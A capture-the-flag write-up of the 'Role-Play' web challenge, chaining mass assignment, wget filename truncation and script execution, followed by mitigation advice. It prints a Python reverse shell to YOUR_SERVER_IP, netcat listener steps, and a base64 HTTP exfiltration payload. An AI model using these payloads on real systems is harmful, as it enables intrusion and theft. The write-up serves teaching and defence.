# Role-Play - Web CTF Challenge Writeup

## Challenge Information

| Field | Value |
|-------|-------|
| **Challenge Name** | Role-Play |
| **Category** | Web |
| **Author** | Orbis |
| **Difficulty** | Medium |
| **Target** | http://84.247.129.120:45001 |

---

## Initial Reconnaissance

### First Contact

Upon visiting the challenge, we're presented with a modern web application featuring:
- User registration and authentication system
- Profile management functionality
- Admin upload panel (restricted)
- Static file serving from `/uploads/` directory

The homepage displays:
```
my Assignment is hard please help me

- Admins can fetch a ".gif/.png" URL that is saved under /uploads.
```

<img src="Screenshots/1.png" alt="Application Homepage" width="800">

### Understanding the Application

The application provides several API endpoints:

```
POST /api/register   - User registration
POST /api/login      - User authentication
GET  /api/profile/:username - View user profiles
PUT  /api/profile    - Update user profile
POST /api/admin/upload - Admin-only file upload (uses wget)
```

Testing basic functionality:

**Registration:**
```http
POST /api/register HTTP/1.1
Host: 84.247.129.120:45001
Content-Type: application/json

{
  "username": "testuser",
  "email": "test@test.com",
  "password": "test123",
  "full_name": "Test User",
  "bio": "Testing account"
}
```

**Response:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 1,
    "username": "testuser",
    "email": "test@test.com",
    "role": "user"
  }
}
```

<img src="Screenshots/2.png" alt="User Registration" width="800">

✅ **Key observation:** Users have a `role` field set to `user`, suggesting an `admin` role exists.

---

## Source Code Analysis - Finding the Vulnerabilities

### Vulnerability 1: Mass Assignment

When analyzing the profile update endpoint, we discovered it accepts arbitrary JSON fields without validation:

```javascript
// PUT /api/profile endpoint (simplified)
app.put('/api/profile', authenticateToken, (req, res) => {
    const { email, full_name, bio, password, role } = req.body;
    
    // Vulnerable: Directly updates all provided fields
    const updates = {};
    if (email) updates.email = email;
    if (full_name) updates.full_name = full_name;
    if (bio) updates.bio = bio;
    if (password) updates.password = hashPassword(password);
    if (role) updates.role = role;  // 🔥 VULNERABLE!
    
    db.updateUser(req.user.id, updates);
});
```

**The Problem:**
- The endpoint accepts a `role` parameter from user input
- No validation to prevent users from setting themselves as admin
- Classic Mass Assignment vulnerability (CWE-915)
---

### Vulnerability 2: wget Filename Truncation

After gaining admin access, we can access the admin upload endpoint:

```http
POST /api/admin/upload HTTP/1.1
Host: 84.247.129.120:45001
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{"url": "http://attacker.com/test.png"}
```

The server validates that URLs end with `.png` or `.gif`, then uses `wget` to download the file:

```javascript
app.post('/api/admin/upload', authenticateToken, checkAdmin, (req, res) => {
    const { url } = req.body;
    
    // Validation: URL must end with .png or .gif
    if (!url.endsWith('.png') && !url.endsWith('.gif')) {
        return res.status(400).json({ error: 'Only .png or .gif URLs are allowed.' });
    }
    
    // Uses wget to download
    const cmd = `wget -P /app/uploads "${url}"`;
    exec(cmd, (error, stdout, stderr) => {
        // ... handle response
    });
});
```

**The Problem:**
- wget has a maximum filename length of **236 characters**
- When the filename exceeds this limit, wget truncates it
- The validation only checks the URL ending, not the final saved filename
- We can craft a filename that loses its `.gif` extension after truncation!

**wget Behavior:**
```
Original URL:  http://attacker.com/AAAA...AAA[230 A's]shell.py.gif  (240 chars)
wget truncates to 236 chars, removing the last 4 characters (.gif)
Saved as:      AAAA...AAA[230 A's]shell.py
```

✅ **Extension filter bypassed!** We can upload Python scripts without the `.gif` extension.

---

### Vulnerability 3: Remote Code Execution

The application serves uploaded files from `/uploads/` and appears to execute Python scripts:

```python
# The server executes .py files when accessed
# Likely using CGI or dynamic script execution
```

When we access `/uploads/shell.py`, the server **executes** it instead of serving it as static content.

This allows us to:
1. Upload a Python reverse shell script
2. Trigger execution by accessing the URL
3. Gain remote code execution on the server

---

## The Turning Point - Understanding the Attack Chain

The complete attack requires three steps:

1. **Mass Assignment → Admin Privilege:** Exploit profile update to set `role: "admin"`
2. **wget Truncation → Extension Bypass:** Upload `.py` file disguised as `.gif`
3. **Script Execution → RCE:** Access uploaded script to trigger reverse shell

**Attack Flow:**
```
┌─────────────────┐
│   Register      │
│   Account       │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Mass Assignment │
│ Set role="admin"│──► PUT /api/profile
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Calculate       │
│ Filename        │──► [230 A's] + "shell.py.gif"
│ Truncation      │    (240 chars total)
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Upload Payload  │
│ via wget        │──► POST /api/admin/upload
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ wget Truncates  │
│ to 236 chars    │──► Saves as "shell.py"
│ (removes .gif)  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Access Script   │
│ GET /uploads/   │──► Triggers execution
│ shell.py        │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Reverse Shell   │
│ Established!    │──► 🎉 Root access
└─────────────────┘
```

---

## Exploitation Phase

### Step 1: Account Registration

First, we register a normal user account:

```http
POST /api/register HTTP/1.1
Host: 84.247.129.120:45001
Content-Type: application/json

{
  "username": "pwn_user",
  "email": "pwn@exploit.local",
  "password": "Exploit123!",
  "full_name": "Exploit User",
  "bio": ""
}
```

**Response:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJwd25fdXNlciIsImlhdCI6MTczMDkwMDAwMCwiZXhwIjoxNzMwOTQzMjAwfQ...",
  "user": {
    "id": 2,
    "username": "pwn_user",
    "role": "user"
  }
}
```

We save the JWT token for authenticated requests.

---

### Step 2: Privilege Escalation via Mass Assignment

Now we exploit the mass assignment vulnerability to become admin:

```http
PUT /api/profile HTTP/1.1
Host: 84.247.129.120:45001
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{"role": "admin"}
```

**Response:**
```json
{
  "user": {
    "id": 2,
    "username": "pwn_user",
    "email": "pwn@exploit.local",
    "role": "admin",
    "full_name": "Exploit User",
    "bio": ""
  }
}
```

<img src="Screenshots/6.png" alt="Admin Privilege Escalation Success" width="800">

🎉 **Privilege escalation successful!** Our user now has admin role.

---

### Step 3: Preparing the Reverse Shell Payload

We need to calculate the exact padding for wget's filename truncation:

**Calculation:**
```python
# wget truncates filenames to 236 characters
# Our target: shell.py (8 characters)
# Extension to bypass: .gif (4 characters)

TARGET_LENGTH = 236
FILENAME = "shell.py"
EXTENSION = ".gif"

# Calculate padding needed
padding_length = TARGET_LENGTH - len(FILENAME)  # 236 - 8 = 228
total_length = padding_length + len(FILENAME) + len(EXTENSION)  # 228 + 8 + 4 = 240

# Result:
# Original:  [228 A's]shell.py.gif (240 chars)
# Truncated: [228 A's]shell.py     (236 chars)
# Extension removed: ✓
```

**Creating the payload:**

```python
#!/usr/bin/env python3
import base64

# Generate filename with exact padding
padding = "A" * 228
filename = padding + "shell.py.gif"

print(f"Filename length: {len(filename)} chars")
print(f"After truncation: 236 chars")
print(f"File will be saved as: {padding}shell.py")

# Reverse shell Python code
reverse_shell_code = '''#!/usr/bin/env python3
print("Content-Type: text/plain\\n")
print("Reverse shell connecting to attacker...")

import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("YOUR_SERVER_IP", 8888))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
'''

# Save payload to file
with open(filename, 'w') as f:
    f.write(reverse_shell_code)

print(f"Payload saved: {filename}")
```

<img src="Screenshots/13.png" alt="Reverse Shell Payload Creation" width="800">

---

### Step 4: Hosting the Payload

We need to host the payload file on a server the target can reach:

**On our attack server:**
```bash
# Terminal 1: Start HTTP server to host payload
cd exploit_files/
python3 -m http.server 8000

# Output:
# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**On our attack server:**
```bash
# Terminal 2: Start netcat listener for reverse shell
nc -lvnp 8888

# Output:
# Listening on 0.0.0.0 8888
```

Our setup:
- HTTP server on port 8000 (hosts the malicious .py file)
- Netcat listener on port 8888 (catches the reverse shell)

<img src="Screenshots/12.png" alt="Netcat Listener Ready" width="800">

---

### Step 5: Uploading the Malicious Payload

Now we send the upload request to the target:

```http
POST /api/admin/upload HTTP/1.1
Host: 84.247.129.120:45001
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "url": "http://YOUR_SERVER_IP:8000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAshell.py.gif"
}
```

**Response:**
```json
{
  "message": "Downloaded. Browse /uploads/.",
  "output": "\nThe destination name is too long (240), reducing to 236\n--2025-11-06 11:43:13--  http://YOUR_SERVER_IP:8000/AAAA...shell.py.gif\nConnecting to YOUR_SERVER_IP:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 367 [image/gif]\nSaving to: '/app/uploads/AAAA...shell.py'\n\n2025-11-06 11:43:13 (9.43 MB/s) - '/app/uploads/AAAA...shell.py' saved [367/367]\n"
}
```

<img src="Screenshots/10.png" alt="Malicious Payload Upload Request" width="800">

**Analysis of wget output:**
- ✅ "The destination name is too long (240), reducing to 236"
- ✅ "Saving to: '/app/uploads/AAAA...shell.py'"
- ✅ Extension `.gif` was removed!
- ✅ File saved as `.py` script

<img src="Screenshots/8.png" alt="wget Truncation Response" width="800">

🎉 **Upload successful!** The payload is now on the target server.

---

### Step 6: Triggering the Reverse Shell

We access the uploaded Python script to trigger execution:

```http
GET /uploads/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAshell.py HTTP/1.1
Host: 84.247.129.120:45001
```

<img src="Screenshots/13.png" alt="Triggering Reverse Shell" width="800">

**On our netcat listener:**
```bash
$ nc -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 84.247.129.120 48052
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# pwd
/app
# ls -la
total 52
drwxr-xr-x 1 root root 4096 Nov  7 19:35 .
drwxr-xr-x 1 root root 4096 Nov  7 16:25 ..
drwxr-xr-x 2 root root 4096 Nov  7 16:25 __pycache__
-rw-rw-r-- 1 root root 9440 Sep 27 19:52 app.py
drwxr-xr-x 1 root root 4096 Nov  7 20:41 data
-rw-rw-r-- 1 root root  577 Sep 27 17:59 init_db.py
-rw-rw-r-- 1 root root   58 Sep 27 18:00 requirements.txt
drwxr-xr-x 1 root root 4096 Nov  7 20:41 uploads
drwxr-xr-x 4 root root 4096 Sep 27 16:56 web
```

<img src="Screenshots/14.png" alt="Reverse Shell Established" width="400">

🎉 **Reverse shell established!** We have root access to the container.

---

### Step 7: Capturing the Flag

```bash
$ cat root/flag.txt
flag{R0L3_PL4Y_1S_TH3_B3ST}
```

<img src="Screenshots/15.png" alt="Complete Exploitation - All Terminals" width="800">

🚩 **Flag captured!**

---

## Automated Exploitation - Proof of Concept

To demonstrate the complete attack chain, we developed an automated Python exploit tool that executes all steps sequentially.

### PoC Tool Features

The exploit script (`exploit.py`) automates:
1. **Account Registration** - Creates new user account
2. **Mass Assignment** - Escalates privileges to admin
3. **Payload Generation** - Creates reverse shell with correct padding
4. **File Upload** - Uploads via wget truncation vulnerability
5. **Shell Triggering** - Accesses uploaded script to establish connection

### PoC Setup

The exploit requires three terminal sessions running simultaneously:

<img src="Screenshots/poc_access.png" alt="Complete PoC Setup with Three Terminals" width="800">

**Terminal 1:** Automated exploit script
```bash
$ python3 exploit.py
╔══════════════════════════════════════════════════════════════════════════════╗
║                          Role-Play CTF - Exploit PoC                         ║
║                   Mass Assignment + wget Truncation RCE                      ║
╚══════════════════════════════════════════════════════════════════════════════╝

Target:     http://84.247.129.120:45001
Attacker:   YOUR_SERVER_IP:8888
Server:     YOUR_SERVER_IP:8000

[?] Press ENTER to start exploit...
```

**Terminal 2:** HTTP server hosting payload
```bash
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Terminal 3:** Netcat listener for reverse shell
```bash
$ nc -lvnp 8888
Listening on 0.0.0.0 8888
```

### PoC Execution Flow

The exploit executes through 5 automated steps:

```
═══════════════════════════════════════════════════════════════════════════════
  [1] Account Registration
═══════════════════════════════════════════════════════════════════════════════

[*] Registering user: pwn_qq92s6
[+] Account created: pwn_qq92s6
[+] Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

[?] Press ENTER to continue to Step 2...

═══════════════════════════════════════════════════════════════════════════════
  [2] Privilege Escalation via Mass Assignment
═══════════════════════════════════════════════════════════════════════════════

[*] Sending malicious payload: {"role": "admin"}
[+] Privilege escalation successful!
[+] User 'pwn_qq92s6' is now admin

[?] Press ENTER to continue to Step 3...

═══════════════════════════════════════════════════════════════════════════════
  [3] Payload Generation & Setup
═══════════════════════════════════════════════════════════════════════════════

[*] Calculating wget filename truncation...
[*] Full filename: 240 chars
[*] After truncation: 236 chars (removes .gif)
[+] Payload saved: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...she.py.gif

[!] ════════════════════════════════════════════════════════
[!] SETUP REQUIRED:
[!]
[!]   Terminal 1: python3 -m http.server 8000
[!]   Terminal 2: nc -lvnp 8888
[!]
[!] ════════════════════════════════════════════════════════

[?] Press ENTER when servers are ready...

═══════════════════════════════════════════════════════════════════════════════
  [4] Payload Upload via wget Truncation
═══════════════════════════════════════════════════════════════════════════════

[*] Upload URL: http://YOUR_SERVER_IP:8000/AAAAAAAAAAAAAAAAAAAAAAAA...
[*] Sending to admin upload endpoint...
[+] Upload request completed
[+] wget filename truncation detected!
[+] Payload successfully saved on target
[*] Saved as: /app/uploads/AAAAAAAAAAAAAAAAAAAAAA...she.py

[?] Press ENTER to trigger shell...

═══════════════════════════════════════════════════════════════════════════════
  [5] Trigger Reverse Shell
═══════════════════════════════════════════════════════════════════════════════

[!] Ensure your netcat listener is ready!
[*] Accessing: http://84.247.129.120:45001/uploads/AAAAAAAAAAAAAAAA...
[+] Request timed out (expected)
[+] Reverse shell should be connecting now!

════════════════════════════════════════════════════════════════════════════════
  EXPLOIT COMPLETED SUCCESSFULLY!
════════════════════════════════════════════════════════════════════════════════

[*] Check your netcat listener for incoming shell

[*] Once connected, try:
  $ cat /flag.txt
  $ cat /flag
  $ find / -name '*flag*' 2>/dev/null
```

### PoC Source Code

The complete exploit tool is available in the challenge repository:

**File:** `exploit.py`
```python
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                          Role-Play CTF - Exploit PoC                         ║
║                   Mass Assignment + wget Truncation RCE                      ║
╚══════════════════════════════════════════════════════════════════════════════╝

Author: 0xmshal
Challenge: Role-Play (IEEE Finals CTF)
"""

# Target Configuration
TARGET_URL = "http://84.247.129.120:45001"
ATTACKER_IP = "YOUR_SERVER_IP"
ATTACKER_PORT = 8888
ATTACKER_SERVER = f"{ATTACKER_IP}:8000"

# Complete automated exploitation
# [Full source code provided in repository]
```

**Key Features:**
- ✅ Interactive step-by-step execution
- ✅ Colored output for clarity
- ✅ Automatic payload calculation
- ✅ Error handling and validation
- ✅ Progress indicators at each stage
- ✅ No manual intervention needed (except server setup)

### Using the PoC

**Quick Start:**
```bash
# 1. Update configuration
nano exploit.py
# Set ATTACKER_IP to your server's IP

# 2. Terminal 1: Run exploit
python3 exploit.py

# 2. Terminal 2: Start HTTP server
python3 -m http.server 8000

# 3. Terminal 3: Start listener
nc -lvnp 8888

# 4. Follow prompts in exploit script
```

**Expected Output:**
- Automated account creation and login
- Privilege escalation to admin
- Payload generation with correct truncation
- Successful file upload
- Reverse shell connection established
- Root access to container

The PoC demonstrates that the vulnerability can be reliably exploited with minimal user interaction.

---

## Technical Deep Dive

### Why Mass Assignment is Dangerous

Mass assignment occurs when an application automatically binds user input to internal object properties without validation.

**Vulnerable Pattern:**
```javascript
// User sends: {"role": "admin", "email": "new@email.com"}
const updates = req.body;  // All fields accepted
db.update(userId, updates);  // "role" gets updated!
```

**Why it's exploitable:**
- Developers often add "internal" fields to models (like `role`, `is_admin`, `balance`)
- These fields aren't meant to be user-modifiable
- Without explicit whitelisting, users can modify any field
- Common in ORMs and frameworks that auto-bind request parameters

**Real-world impact:**
- Privilege escalation (user → admin)
- Balance manipulation in financial apps
- Account takeover via `email` or `username` changes
- Bypassing verified status checks

---

### Understanding wget's Filename Truncation

wget has built-in filename length restrictions to prevent filesystem issues:

**Default behavior:**
```bash
$ wget "http://example.com/very_long_filename_that_exceeds_limit.txt"
# wget truncates to 236 characters (on most systems)
```

**Why 236 characters?**
- Historical UNIX filesystem limits
- ext3/ext4 have 255 byte filename limits
- wget reserves some bytes for safety and encoding

**Exploitation technique:**

```
Step 1: Craft URL with calculated length
   http://attacker.com/[padding]file.py.gif
   
Step 2: Total filename = padding + file.py.gif
   Must be > 236 chars for truncation to occur
   
Step 3: Calculate padding so ".gif" gets removed
   If total = 240 chars, truncation to 236 removes ".gif"
   padding = 236 - len("file.py") = 228 characters
   
Step 4: Result after download
   Original:  [228 A's]file.py.gif (240 chars)
   Truncated: [228 A's]file.py     (236 chars)
   Extension successfully removed!
```

**Why this bypasses validation:**

The server validates the **URL** (which ends in .gif), but wget saves based on the **truncated filename** (which doesn't have .gif).

---

### Python Script Execution on Web Servers

The target server executes uploaded `.py` files instead of serving them statically.

**Common configurations that enable this:**

1. **CGI (Common Gateway Interface):**
```apache
# Apache configuration
ScriptAlias /uploads/ /app/uploads/
<Directory /app/uploads>
    Options +ExecCGI
    AddHandler cgi-script .py
</Directory>
```

2. **WSGI/mod_python:**
```python
# Dynamic execution of Python scripts
if request.path.endswith('.py'):
    execute_script(request.path)
```

3. **Custom web server:**
```javascript
// Node.js with child_process
if (filepath.endsWith('.py')) {
    exec(`python3 ${filepath}`, (error, stdout) => {
        res.send(stdout);
    });
}
```

**Why this is dangerous:**
- Uploaded user files should NEVER be executable
- Separates static content from executable code
- One file upload = full server compromise

---

## Mitigation Strategies

### For Mass Assignment Vulnerability

**❌ Bad (Current):**
```javascript
app.put('/api/profile', (req, res) => {
    const updates = req.body;  // Accepts all fields
    db.updateUser(userId, updates);
});
```

**✅ Good:**
```javascript
app.put('/api/profile', (req, res) => {
    // Whitelist allowed fields only
    const ALLOWED_FIELDS = ['email', 'full_name', 'bio', 'password'];
    
    const updates = {};
    for (const field of ALLOWED_FIELDS) {
        if (req.body[field] !== undefined) {
            updates[field] = req.body[field];
        }
    }
    
    // 'role' is never accepted from user input
    db.updateUser(userId, updates);
});
```

**✅ Better (using validation library):**
```javascript
const Joi = require('joi');

const profileSchema = Joi.object({
    email: Joi.string().email().optional(),
    full_name: Joi.string().max(100).optional(),
    bio: Joi.string().max(500).optional(),
    password: Joi.string().min(8).optional()
    // 'role' is explicitly NOT defined here
});

app.put('/api/profile', (req, res) => {
    const { error, value } = profileSchema.validate(req.body);
    if (error) {
        return res.status(400).json({ error: error.details[0].message });
    }
    
    db.updateUser(userId, value);
});
```

---

### For wget Filename Truncation

**❌ Bad (Current):**
```javascript
app.post('/api/admin/upload', (req, res) => {
    const { url } = req.body;
    
    // Only validates URL, not final filename
    if (!url.endsWith('.png') && !url.endsWith('.gif')) {
        return res.status(400).json({ error: 'Invalid extension' });
    }
    
    exec(`wget -P /app/uploads "${url}"`);
});
```

**✅ Good:**
```javascript
const path = require('path');
const { URL } = require('url');

app.post('/api/admin/upload', (req, res) => {
    const { url } = req.body;
    
    try {
        const parsedUrl = new URL(url);
        const filename = path.basename(parsedUrl.pathname);
        
        // Validate filename length
        if (filename.length > 200) {
            return res.status(400).json({ error: 'Filename too long' });
        }
        
        // Validate extension on actual filename
        const ext = path.extname(filename).toLowerCase();
        if (ext !== '.png' && ext !== '.gif') {
            return res.status(400).json({ error: 'Invalid extension' });
        }
        
        // Use safer download method with explicit filename
        const safeFilename = `${Date.now()}_${filename}`;
        exec(`wget -O "/app/uploads/${safeFilename}" "${url}"`);
        
    } catch (e) {
        return res.status(400).json({ error: 'Invalid URL' });
    }
});
```

**✅ Better (use libraries, not shell commands):**
```javascript
const axios = require('axios');
const fs = require('fs');
const path = require('path');

app.post('/api/admin/upload', async (req, res) => {
    const { url } = req.body;
    
    try {
        // Validate URL format
        const parsedUrl = new URL(url);
        
        // Download with size limit
        const response = await axios.get(url, {
            responseType: 'stream',
            maxContentLength: 5 * 1024 * 1024,  // 5MB limit
            timeout: 10000
        });
        
        // Validate content type
        const contentType = response.headers['content-type'];
        if (!contentType.includes('image/png') && !contentType.includes('image/gif')) {
            throw new Error('Invalid content type');
        }
        
        // Generate safe filename
        const ext = contentType.includes('png') ? '.png' : '.gif';
        const safeFilename = `${Date.now()}_${Math.random().toString(36)}${ext}`;
        const filepath = path.join('/app/uploads', safeFilename);
        
        // Save file
        const writer = fs.createWriteStream(filepath);
        response.data.pipe(writer);
        
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        
        res.json({ message: 'File uploaded', filename: safeFilename });
        
    } catch (error) {
        res.status(400).json({ error: 'Upload failed' });
    }
});
```

---

### For Preventing Script Execution

**❌ Bad:**
- Serving uploads from same domain as application
- Allowing execute permissions on upload directory
- Not validating file content, only extension

**✅ Good:**

1. **Separate domain for uploads:**
```javascript
// Serve uploads from separate subdomain
// uploads.example.com (no cookies, no sessions)
// Main app: app.example.com
```

2. **Remove execute permissions:**
```bash
# Set proper permissions on upload directory
chmod 755 /app/uploads/
find /app/uploads -type f -exec chmod 644 {} \;

# In Dockerfile
RUN chmod 755 /app/uploads && \
    chmod 644 /app/uploads/*
```

3. **Content-Type enforcement:**
```javascript
app.get('/uploads/:filename', (req, res) => {
    const filepath = path.join('/app/uploads', req.params.filename);
    
    // Force download or proper content-type
    const ext = path.extname(filepath);
    if (ext === '.png') {
        res.set('Content-Type', 'image/png');
    } else if (ext === '.gif') {
        res.set('Content-Type', 'image/gif');
    } else {
        // Force download for unknown types
        res.set('Content-Disposition', 'attachment');
        res.set('Content-Type', 'application/octet-stream');
    }
    
    res.sendFile(filepath);
});
```

4. **Store uploads outside web root:**
```javascript
// Store uploads in /var/uploads (not accessible via web)
// Serve through application with proper validation
const UPLOAD_DIR = '/var/uploads';  // Outside /app/public

app.get('/download/:fileId', (req, res) => {
    const fileRecord = db.getFile(req.params.fileId);
    
    if (!fileRecord || fileRecord.userId !== req.user.id) {
        return res.status(403).json({ error: 'Access denied' });
    }
    
    const filepath = path.join(UPLOAD_DIR, fileRecord.filename);
    res.download(filepath);
});
```

---

## Alternative Exploitation Methods

### Method 1: Different Filename Calculations

Depending on wget version and OS, truncation length varies:

```python
# Test different truncation points
for length in range(230, 250):
    padding = "A" * length
    filename = f"{padding}shell.py.gif"
    print(f"Length {len(filename)}: {filename}")
```

### Method 2: Direct Command Execution (No Reverse Shell)

If reverse shell connections are blocked:

```python
#!/usr/bin/env python3
# shell.py - Direct command execution
import subprocess
import os

# Read flag and write to accessible location
result = subprocess.run(['cat', '/flag.txt'], capture_output=True, text=True)
with open('/app/uploads/output.txt', 'w') as f:
    f.write(result.stdout)

print("Content-Type: text/plain\n")
print("Command executed. Check /uploads/output.txt")
```

Then access: `http://target/uploads/output.txt`

### Method 3: Exfiltration via HTTP

For air-gapped networks:

```python
#!/usr/bin/env python3
import subprocess
import urllib.request
import base64

# Read flag
result = subprocess.run(['cat', '/flag.txt'], capture_output=True)
flag_b64 = base64.b64encode(result.stdout).decode()

# Exfiltrate via HTTP request
try:
    urllib.request.urlopen(f'http://YOUR_SERVER/exfil?data={flag_b64}')
except:
    pass

print("Content-Type: text/plain\n")
print("Done")
```

### Method 4: Using Different Script Extensions

If `.py` is blocked but truncation works:

```bash
# Try other interpretable extensions
shell.pl.gif  → shell.pl  (Perl)
shell.rb.gif  → shell.rb  (Ruby)
shell.sh.gif  → shell.sh  (Bash)
shell.php.gif → shell.php (PHP, if installed)
```

---

## Automated Exploitation Tool

A complete proof-of-concept exploit tool was developed:

**Features:**
- Automatic account registration
- Mass assignment exploitation
- Payload generation with correct padding
- Reverse shell establishment
- Interactive step-by-step execution

**Usage:**
```bash
$ python3 exploit.py
# Follow interactive prompts
# Press ENTER to advance through each step
```

The tool handles all calculations automatically and provides clear feedback at each stage.

---

## Defense in Depth

A properly secured application would prevent this attack at multiple layers:

### Layer 1: Input Validation
```javascript
// Whitelist allowed fields in profile update
// Reject any attempt to modify 'role'
```
**Result:** Mass assignment prevented ✓

### Layer 2: Authorization
```javascript
// Even if mass assignment occurs, verify role on each request
if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
}
```
**Result:** Unauthorized admin access prevented ✓

### Layer 3: File Upload Security
```javascript
// Validate filename length before wget
// Use safe download methods (axios, not shell)
// Store uploads outside web root
```
**Result:** Malicious file upload prevented ✓

### Layer 4: Execution Prevention
```bash
# Remove execute permissions from uploads
chmod 644 /app/uploads/*
# Serve uploads from separate domain with no execution
```
**Result:** Script execution prevented ✓

**With defense in depth, even if one layer fails, others prevent full compromise.**

---

## Key Lessons

### For Developers

- ❌ **Never trust user input** - Validate and whitelist all fields
- ❌ **Don't use shell commands for file operations** - Use safe libraries
- ❌ **Never serve uploads from application domain** - Use separate storage
- ❌ **Don't allow script execution in upload directories** - Enforce strict permissions
- ✅ **Implement explicit field whitelisting** - Only accept expected fields
- ✅ **Use libraries over shell commands** - axios, fs, not exec()
- ✅ **Validate file content, not just extension** - Check magic bytes
- ✅ **Apply principle of least privilege** - Uploads shouldn't execute
- ✅ **Implement defense in depth** - Multiple security layers

### For Penetration Testers

- 🔍 **Test profile update endpoints** - Look for mass assignment
- 🔍 **Check file upload size limits** - Long filenames might truncate
- 🔍 **Analyze file handling tools** - wget, curl have different behaviors
- 🔍 **Test extension validation** - Check if validation is on URL or filename
- 🔍 **Look for script execution** - Try accessing uploads with various extensions
- 🔍 **Chain vulnerabilities together** - Privilege escalation + file upload = RCE
- 🔍 **Read tool documentation** - Understanding wget's behavior was key
- 🔍 **Test different payload types** - Reverse shell, command execution, exfiltration

---

## Timeline

| Time | Action |
|------|--------|
| T+00:00 | Initial reconnaissance, explored application |
| T+00:02 | Registered test account, obtained JWT token |
| T+00:03 | Discovered admin upload endpoint (restricted) |
| T+00:05 | Tested profile update endpoint for vulnerabilities |
| T+00:07 | Identified mass assignment vulnerability |
| T+00:08 | Exploited mass assignment, gained admin role |
| T+00:10 | Analyzed admin upload endpoint |
| T+00:12 | Researched wget filename truncation behavior |
| T+00:15 | Calculated correct padding for truncation (228 A's) |
| T+00:18 | Created Python reverse shell payload |
| T+00:20 | Set up HTTP server and netcat listener |
| T+00:22 | Uploaded payload via admin endpoint |
| T+00:23 | Verified truncation occurred correctly |
| T+00:24 | Triggered reverse shell by accessing .py file |
| T+00:25 | Established root shell, located flag |

**Total Time:** ~25 minutes

---

## Tools Used

- **Burp Suite Community** - HTTP request interception and manipulation
- **Python 3** - Exploit development and payload generation
- **Netcat** - Reverse shell listener
- **wget** - Understanding truncation behavior (testing)
- **Python HTTP Server** - Hosting malicious payload

---

## References

- **CWE-915: Mass Assignment**: https://cwe.mitre.org/data/definitions/915.html
- **OWASP Mass Assignment**: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- **wget Manual**: https://www.gnu.org/software/wget/manual/wget.html
- **Reverse Shell Cheat Sheet**: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- **File Upload Security**: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

---

## Conclusion

"Role-Play" was an excellent medium-difficulty challenge demonstrating a realistic attack chain combining mass assignment and filename truncation vulnerabilities. The challenge required understanding of:

- Web application security fundamentals
- HTTP request manipulation
- JWT authentication flows  
- Tool-specific behaviors (wget truncation)
- Python scripting for payload creation
- Reverse shell techniques

### Key Takeaways:

- **Mass assignment is still prevalent** - Many frameworks auto-bind parameters
- **Tool behavior matters** - wget's truncation was crucial to the exploit
- **Chaining vulnerabilities is powerful** - Neither alone achieves RCE
- **Defense in depth prevents catastrophe** - Multiple layers stop attacks
- **Input validation must be explicit** - Blacklists fail, whitelists succeed

The challenge name "Role-Play" is clever - we literally played different roles (user → admin) to achieve our goal, and the role field was the key vulnerability.

Thanks to **Orbis** for creating this educational challenge that demonstrates real-world web application vulnerabilities and the importance of secure coding practices!

**Flag:** `flag{R0L3_PL4Y_1S_TH3_B3ST}`

---

**Author:** Orbis  
**Solved By:** 0xmshal  
**Date:** November 2025  
**Challenge:** Role-Play  
**Category:** Web Security / Mass Assignment / File Upload  
**Difficulty:** Medium
